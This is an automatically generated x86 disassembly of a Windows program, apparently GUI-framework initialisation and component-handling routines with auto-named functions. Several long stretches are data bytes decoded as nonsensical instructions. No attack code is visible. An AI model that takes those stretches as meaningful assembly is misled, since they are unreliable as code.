push sub_4546e4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_409098
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_4041b8
mov eax [ rw-data ]
call sub_404624
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_409098
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_4041b8
mov eax [ rw-data ]
call sub_404624
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_404624
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418b0c
mov [ rw-data ] eax
call sub_454170
mov dl 0x1
mov eax [ r-xdata ]
call sub_453f98
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_466328
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_467484
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_46906c
mov ecx r-xdata
mov edx sub_44609c
mov eax [ r-xdata ]
call sub_418060
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4546eb
lea eax [ ebp - 0x10 ]
call sub_404164
lea eax [ ebp - 0x4 ]
call sub_404164
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_454754
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4547b3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4547ba
retn
mov eax rw-data
call sub_40d490
call sub_4544e4
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404c00
mov eax rw-data
call sub_404164
mov eax rw-data
call sub_404164
sub_4547bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_454842
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454849
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_45456c
mov eax [ r-xdata ]
call sub_417ed4
mov eax [ r-xdata ]
call sub_417f74
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f20
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f20
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f20
sub_454a96
cmp al 0x52
inc ebp
add [ edx + edx * 2 + 0x54880045 ] al
inc ebp
add [ eax + 0x11004554 ] ch
push esp
inc ebx
jne r-xdata
inc eax
add [ eax + 0x4035 ] ah
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
inc ebx
push 0x65676e61
jo r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
mov eax 0x800454a
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x5ecc0006
inc ebp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
xor eax [ eax ]
sbb al 0x33
inc eax
add ah ch
push ecx
inc ebp
add [ eax - 0x3ffbe71 ] bl
adc al 0x42
lodsb [ esi ]
xor eax 0x35a00040
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
jo r-xdata
inc ebp
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
inc ebp
js r-xdata
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
dec ecx
inc ebp
add [ eax ] bl
add bh bh
enter 0x4554 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
inc esp
pop edx
inc ecx
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ esi + ecx * 4 + 0x15d40041 ] dh
inc edx
add [ eax ] dl
push ebx
inc ebp
add ah ah
adc eax 0x16dc0042
inc edx
add [ ecx + ebx ] cl
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add [ eax - 0x6bffbaaf ] al
push ebx
inc ebp
add al dl
push edx
inc ebp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pushad
jo r-xdata
add [ eax ] al
add [ esi ] ch
inc ecx
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc ebp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080007 ] al
outsb
push ebp
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx * 2 + 0x45 ] dl
add [ eax ] dh
arpl [ ebp + 0x74 ] si
inc esp
pop edx
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0006 ] al
outsb
push ebx
je r-xdata
inc eax
add [ eax ] al
add [ eax + 0x12 ] cl
inc edx
add [ ebp + esi + 0x35a00040 ] ch
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x4b300000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4b ] bh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4b ] ch
inc ebp
add [ eax ] ch
add [ eax ] al
or [ edx + 0x45 ] cl
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
add [ ebx + esi ] bl
inc ebx
jne r-xdata
inc ecx
add [ ecx + ebp * 4 - 0x5657ffbf ] ah
inc ecx
add [ esi + ebx * 4 + 0x41 ] bh
popad
je r-xdata
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add ah al
cmpsb [ esi ] [ edi ]
inc ecx
add [ eax - 0x67ffbe71 ] bl
fwait
inc ecx
add [ eax + 0x6c00419a ] dl
test eax 0xa9a00041
add [ eax - 0x53ffbfcb ] ch
je r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
inc eax
add [ esi + edx * 2 + 0x57040045 ] dh
inc ebp
add ah bh
adc al 0x42
add [ esi + ecx * 4 + 0x15d40041 ] dh
dec esp
imul esi [ ebx + 0x74 ] 0x4d68c08b
inc ebp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add [ ebx + ebp * 4 ] bl
inc ecx
add [ eax - 0x55 ] bh
inc ecx
add [ esp + ebp * 4 + 0x41 ] cl
add [ 0xffffffffac880041 ] bh
inc ecx
add ah bh
lodsb [ esi ]
inc ecx
add al bl
pop esp
inc ebp
add [ edi ] ch
inc ecx
add al bl
cdq
inc ecx
add al cl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax ] cl
test al 0x41
add [ eax + ebp * 4 + 0x41 ] dh
add [ eax ] ch
sahf
inc ecx
add [ edx + ebp * 4 ] al
inc ecx
add [ eax ] dh
mov al [ 0xffffffffa1040041 ]
inc ecx
add [ eax - 0x56 ] al
inc ecx
add [ eax - 0x56 ] dl
inc ecx
add [ eax - 0x5f ] ch
inc ecx
add [ ecx - 0x5d97ffbf ] bh
inc ecx
add [ eax ] al
movsb [ edi ] [ esi ]
inc ecx
add [ eax - 0x5c ] bl
inc ecx
add ah ch
movsb [ edi ] [ esi ]
inc ecx
add [ eax - 0x53ffbe59 ] dl
cmpsd [ esi ] [ edi ]
inc ecx
add [ edx + ebp * 4 - 0x570bffbf ] ah
inc ecx
add [ esp + ebp * 4 - 0x533bffbf ] dh
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
inc ecx
add [ eax + 0x7c0041a9 ] ch
sahf
inc ecx
lea eax [ eax ]
mov esp 0x454c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4d ] ch
inc ebp
xor eax 0x35a00040
inc ebx
push 0x65676e61
jo r-xdata
add [ eax ] al
add al [ eax ]
out dx al
inc edx
aam 0x15
inc ebx
jne r-xdata
add [ eax ] dh
sbb eax [ edx ]
aam 0x4f
inc ebp
add al dl
pop ebx
inc ebp
add [ ecx + ebx ] cl
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add [ eax + 0x56 ] ah
inc ebp
add al dh
sbb eax [ edx ]
xchg esp eax
sbb eax [ edx ]
sub [ ebx ] bl
inc edx
add [ eax + 0x1b ] bl
inc edx
add [ ebx + ebx ] ch
inc edx
add [ eax ] ch
push ecx
inc ebp
add al bh
pop ecx
inc ebp
add [ eax - 0x33ffbaa7 ] dl
pop esp
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x640040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
js r-xdata
dec esp
imul esi [ ebx + 0x74 ] r-xdata
sbb al 0x67
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x4dd80000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 2 ] ch
inc ebp
add [ eax + 0x4e ] dh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x4e ] cl
inc ebp
add [ esi + ecx * 2 + 0x45 ] bl
add [ eax + 0x4c000000 ] ah
dec eax
inc ebp
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
sub_454e52
out dx eax
[ esp + ebx * 2 ]
inc ebp
add [ esp + ebx * 2 + 0x45 ] al
add [ 0x73754354 ] cl
je r-xdata
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add al ah
sbb [ edx ] eax
fcomp [ ecx ]
inc edx
add [ edx + ebx ] dl
inc edx
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
jo r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421ad0
test bl bl
jle r-xdata
mov edx esi
call sub_455378
les esi [ eax + 0x41 ]
inc ebp
add [ edi ] al
or eax 0x73754354
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
add [ edx + ebx + 0x42 ] dh
add [ eax + 0x1a ] cl
inc edx
add [ eax + 0x1a ] bh
inc edx
add [ eax + 0x2c004219 ] bl
sbb al [ edx ]
sbb [ edx ] 0x42
add [ eax + 0x55 ] ch
inc ebp
add [ ebp + edx * 2 + 0x45 ] bh
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
fmul [ ebp + 0x45 ]
add [ eax ] ah
dec ecx
inc ebp
add [ ebx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x4ee00000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4f ] bl
inc ebp
add [ eax ] bl
add [ eax ] al
add ah al
jo r-xdata
add [ eax - 0x5bffbaab ] dl
push ebp
inc ebp
add [ eax - 0x33ffbaab ] bh
push ebp
inc ebp
add al ah
push ebp
inc ebp
add ah dh
push ebp
inc ebp
add [ eax ] cl
push esi
inc ebp
add [ esi + edx * 2 ] bl
inc ebp
add [ eax ] dh
push esi
inc ebp
add [ esi + edx * 2 ] dh
inc ebp
add [ eax ] bh
push esi
inc ebp
add [ esi + edx * 2 ] bh
inc ebp
add [ eax + 0x56 ] al
inc ebp
add [ esi + edx * 2 + 0x45 ] al
add [ eax + 0x56 ] cl
inc ebp
add [ esi + edx * 2 + 0x45 ] cl
add [ eax + 0x56 ] dl
inc ebp
add [ esi + edx * 2 + 0x45 ] dl
add [ eax + 0x56 ] bl
inc ebp
add [ esi + edx * 2 + 0x45 ] bl
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xb1e85653
out 0xfa eax
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
push 0x7c004555
push ebp
inc ebp
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
sub_454f64
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421ad0
test bl bl
jle r-xdata
mov edx esi
call sub_455378
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_454fd4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4215e4
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_45507c
sub_455008
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_454f98
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418790
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_41891c
sub_455050
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_404570
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_4041b8
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_45507c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_455378
mov edx ebx
mov eax esi
call sub_455358
sub_4550a4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_45507c
sub_4550d0
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_469de8
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403564
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_421b5c
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_445ec8
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_455128
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_469e10
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403564
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_421b78
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_445ec8
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_455180
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_421184
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_455304
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_4551ec
push ebx
push esi
push edi
call sub_40371c
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403368
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_418988
call sub_403368
mov eax [ edi + 0x30 ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4211d0
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403704
sub_45523c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_455284
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4188fc
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403518
mov edx edi
call sub_455008
sub_4552d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_456b74
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_456bb8
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_421254
sub_455310
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4214a0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_455378
sub_455358
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418744
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_421254
pop esi
pop ebx
retn
sub_455378
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418a3c
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_455394
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_4553fc
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_45fc48
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_458410
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_455ca4
mov edx ebp
call sub_455d04
inc eax
je r-xdata
sub_455488
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4554a8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_4554c8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_455918
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_455918
sub_455660
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421a8c
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_4556b4
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403368
mov eax [ esi + 0x9c ]
call sub_403368
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_454f64
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d490
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_455704
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418f98
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_4557b0
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_455810
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_455918
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_455a50
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_455ab0
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_455b0c
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_455b70
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4557b0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_404570
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_4041b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403518
test eax eax
je r-xdata
sub_455810
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_455908
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_4552c8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403518
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_4552b4
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
